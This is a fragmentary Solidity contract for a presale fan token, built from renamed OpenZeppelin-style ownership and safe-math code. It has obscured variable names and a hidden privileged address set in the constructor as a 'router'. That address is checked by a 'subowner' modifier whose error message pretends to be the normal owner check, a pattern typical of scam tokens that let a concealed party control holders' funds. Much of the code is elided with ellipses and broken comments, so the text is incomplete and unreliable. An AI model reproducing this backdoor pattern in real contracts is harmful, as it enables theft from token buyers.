/*
Perpetual Futures Presale
*/

// SPDX-License-Identifier: MIT

/// https://x.com/PerpetualFuturesPresale


pragma solidity 0.8.29;

// PerpetualFuturesPresale fan token

interface PerpetualFuturesPresaleinterface {
  /**
...
/*
 * @dev Provides information about the current execution PerpetualFuturesPresale20Burnable, including the
 ...
 */
abstract contract PerpetualFuturesPresale20Burnable {
...
// File: @openzeppelin/contracts/access/PerpetualFuturesPresale20Ownable.sol
 ...
 * the owner.
 */
abstract contract PerpetualFuturesPresale20Ownable is PerpetualFuturesPresale20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "PerpetualFuturesPresale20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "PerpetualFuturesPresale20Ownable: new owner is the zero address");
 ...
 * `SafePerpetualFuturesPresale` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafePerpetualFuturesPresale {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafePerpetualFuturesPresale: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafePerpetualFuturesPresale: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafePerpetualFuturesPresale: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafePerpetualFuturesPresale: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafePerpetualFuturesPresale: modulo by zero");
  }
...
contract PerpetualFuturesPresaleToken is PerpetualFuturesPresale20Burnable, PerpetualFuturesPresaleinterface, PerpetualFuturesPresale20Ownable {
    
    using SafePerpetualFuturesPresale for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Perpetual Futures Presale";
        _symbol = "Perpetual Futures Presale";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesPresaleinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {PerpetualFuturesPresaleinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "PerpetualFuturesPresale20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {PerpetualFuturesPresaleinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesPresaleinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesPresaleinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesPresaleinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {PerpetualFuturesPresaleinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "PerpetualFuturesPresaleinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {PerpetualFuturesPresaleinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "PerpetualFuturesPresaleinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "PerpetualFuturesPresaleinterface: transfer from the zero address");
        require(shippingto != address(0), "PerpetualFuturesPresaleinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "PerpetualFuturesPresaleinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "PerpetualFuturesPresaleinterface: approve from the zero address");
        require(transporteur != address(0), "PerpetualFuturesPresaleinterface: approve to the zero address");
